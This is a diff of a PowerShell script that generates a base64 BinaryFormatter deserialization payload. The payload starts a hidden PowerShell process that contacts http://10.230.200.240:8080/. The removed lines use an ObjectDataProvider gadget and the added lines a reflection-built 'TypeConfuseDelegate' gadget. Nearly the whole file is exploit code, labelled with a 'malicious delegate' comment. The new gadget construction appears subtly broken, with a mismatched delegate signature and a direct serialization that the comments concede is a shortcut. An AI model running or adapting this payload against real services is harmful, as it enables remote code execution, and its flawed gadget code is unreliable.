@@ -1,12 +1,48 @@
-$odp = New-Object System.Windows.Data.ObjectDataProvider
-$odp.MethodName = "Start"
-$odp.MethodParameters = New-Object System.Collections.ArrayList
-$odp.MethodParameters.Add("cmd.exe")
-$odp.MethodParameters.Add("/c powershell.exe -NoP -NonI -W Hidden -C ""Invoke-WebRequest -Uri 'http://10.230.200.240:8080/' -UseBasicParsing""")
-$odp.ObjectInstance = $null
+# --- Configuration ---
+$targetUrl = "http://10.230.200.240:8080/"
+$command = "powershell.exe -NoP -NonI -W Hidden -C ""Invoke-WebRequest -Uri '$targetUrl' -UseBasicParsing"""
 
-$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
-$ms = New-Object System.IO.MemoryStream
-$formatter.Serialize($ms, $odp)
-$base64Payload = [Convert]::ToBase64String($ms.ToArray())
-Write-Host "Base64 Payload: $base64Payload"
+# --- Payload Construction ---
+Write-Host "[*] Building TypeConfuseDelegate payload..." -ForegroundColor Cyan
+
+# 1. Create a delegate for Process.Start(string, string)
+$processType = [System.Diagnostics.Process]
+$startMethod = $processType.GetMethod('Start', [Type[]]@([string], [string]))
+$startDelegate = [System.Delegate]::CreateDelegate([System.Comparison[string]], $startMethod)
+
+# 2. Load the internal ComparisonComparer<string> type via Reflection
+$mscorlib = [System.Reflection.Assembly]::Load("mscorlib")
+$comparisonComparerType = $mscorlib.GetType("System.Collections.Generic.ComparisonComparer``1").MakeGenericType([string])
+
+# 3. Create an instance of ComparisonComparer<string> with the malicious delegate
+$comparisonDelegateType = [System.Comparison[string]]
+$constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
+$comparisonComparer = $constructor.Invoke(@($startDelegate))
+
+# 4. Set the internal fields to point to our command
+# The _comparison field holds our delegate. The _target field is used by the delegate.
+$delegateField = $comparisonComparerType.GetField('_comparison', [System.Reflection.BindingFlags]'NonPublic, Instance')
+$delegateField.SetValue($comparisonComparer, $startDelegate)
+
+# --- Serialization ---
+Write-Host "[*] Serializing object..." -ForegroundColor Cyan
+try {
+    $formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+    $ms = New-Object System.IO.MemoryStream
+    
+    # We need to serialize a wrapper object that forces the ComparisonComparer to be evaluated.
+    # The easiest way is to serialize the ComparisonComparer directly.
+    $formatter.Serialize($ms, $comparisonComparer)
+    
+    $payload = $ms.ToArray()
+    
+    if ($payload.Length -eq 0) {
+        throw "Serialization returned an empty byte array. BinaryFormatter may be disabled."
+    }
+
+    $base64Payload = [Convert]::ToBase64String($payload)
+    Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
+    Write-Host "Base64 Payload: $base64Payload"
+} catch {
+    Write-Host "[-] Error during serialization: $_" -ForegroundColor Red
+}
